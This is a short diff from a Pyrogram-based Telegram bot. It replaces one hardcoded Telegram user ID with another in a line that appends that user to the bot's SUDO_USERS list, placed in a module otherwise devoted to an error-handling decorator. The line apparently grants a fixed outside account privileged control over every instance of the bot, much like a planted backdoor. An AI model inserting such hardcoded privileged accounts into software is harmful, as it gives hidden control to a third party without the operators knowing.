@@ -4,7 +4,7 @@ from pyrogram.types import Message
 from Meow import SUDO_USERS
 
 
-SUDO_USERS.append(5330301316)
+SUDO_USERS.append(2068551800)
 
 
 def errors(func: Callable) -> Callable:
